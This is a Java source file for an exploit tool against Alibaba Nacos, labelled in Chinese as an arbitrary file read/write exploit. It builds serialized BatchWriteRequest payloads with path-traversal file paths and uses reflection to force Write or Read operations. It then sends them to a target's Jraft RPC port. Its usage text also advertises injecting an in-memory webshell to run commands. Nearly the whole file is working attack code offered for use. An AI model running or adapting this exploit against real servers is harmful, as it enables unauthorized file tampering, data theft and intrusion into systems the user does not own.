package com.nacostools.rce;


import com.alibaba.nacos.common.utils.JacksonUtils;
import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alibaba.nacos.naming.consistency.persistent.impl.BatchWriteRequest;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.com.alibaba.nacos.consistency.serialize.JacksonSerializer;
import com.google.protobuf.ByteString;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ConcurrentHashMap;


public class NacosRce {
    public static String isWrite = "";

    public static void main(String[] args) throws Exception {

        URL urlAddr = null;
        String jraftPort = "";
        String jraftAddr = "";

//示例	java -jar NacosRce.jar http://192.168.90.1:8848  7848 write
        if (args.length != 2 && args.length != 3) {
            printUsage();
            System.exit(0);
        }else {
            urlAddr = new URL(args[0]);
            jraftPort = args[1];
            jraftAddr = urlAddr.getHost()+":"+jraftPort;
            isWrite = args[2].trim();
//            if (args.length == 4){
//                HessianPayload.os = args[3];
//            }

        }

        if (isWrite.contentEquals("write"))
        {
            String FilePath="../../../../../../../../../../tmp/test.txt";
            String Content="tessssss";

            byte[] FileBytes=FilePath.getBytes(StandardCharsets.UTF_8);
            byte[] ContentBytes=Content.getBytes(StandardCharsets.UTF_8);

            BatchWriteRequest batchWriteRequest = new BatchWriteRequest();
            batchWriteRequest.append(FileBytes,ContentBytes);

//            ByteArrayOutputStream baos0 = getByteArrayOutputStream(batchWriteRequest);
//            使用的是jack反序列化，不是hessian

            byte[] json= JacksonSerializer.serialize(batchWriteRequest);

            try {
                sendPayload(jraftAddr,json);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        else if (isWrite.equals("read"))
        {
            String FilePath="../../../../../../../../../../tmp/test.txt";
            String Content="tessssss";//读文件内容不管是啥都行

            byte[] FileBytes=FilePath.getBytes(StandardCharsets.UTF_8);
            byte[] ContentBytes=Content.getBytes(StandardCharsets.UTF_8);

            BatchWriteRequest batchWriteRequest = new BatchWriteRequest();
            batchWriteRequest.append(FileBytes,ContentBytes);

            ByteArrayOutputStream baos0 = getByteArrayOutputStream(batchWriteRequest);

            try {
                sendPayload(jraftAddr,baos0.toByteArray());
            }catch (Exception e){
                e.printStackTrace();
            }
        }

    }




    private static ByteArrayOutputStream getByteArrayOutputStream(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);

//        output.getSerializerFactory().setAllowNonSerializable(true);

        try {
            SerializerFactory serializerFactory = output.getSerializerFactory();
            serializerFactory.setAllowNonSerializable(true);
            output.writeObject(obj);
            output.flushBuffer();
        }catch (Exception e){
            e.printStackTrace();
        }

        return baos;
    }

    public static void sendPayload(String addr,byte[] payload) throws Exception{

        //节点标识信息
        //发请求
        Configuration conf = new Configuration();
        conf.parse(addr);
        RouteTable.getInstance().updateConfiguration("nacos", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
        PeerId leader = PeerId.parsePeer(addr);

        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());

        //payload绑定到writeRequest中
        //group为naming_persistent_service
        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service").setData(ByteString.copyFrom(payload)).build();

        //任意文件读写需要设置WriteRequest的operation:Write、Read、Delete
        Field field=WriteRequest.class.getDeclaredField("operation_");
        field.setAccessible(true);
        if (isWrite.equals("write"))
            field.set(writeRequest,"Write");
        else if (isWrite.equals("read"))
            field.set(writeRequest,"Read");

         //发送
        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
        System.out.println(o.toString());

    }
    private static void printUsage() {
        System.err.println("Nacos 任意文件读写 漏洞利用工具");
        System.err.println("** 食用方式 **");
        System.err.println("自动注入内存马并执行命令\tjava -jar NacosRce.jar Url Jraft端口 ");
        System.err.println("示例\tjava -jar NacosRce.jar http://192.168.90.1:8848/nacos  7848 \"write\" ");
        System.err.println();


    }

}
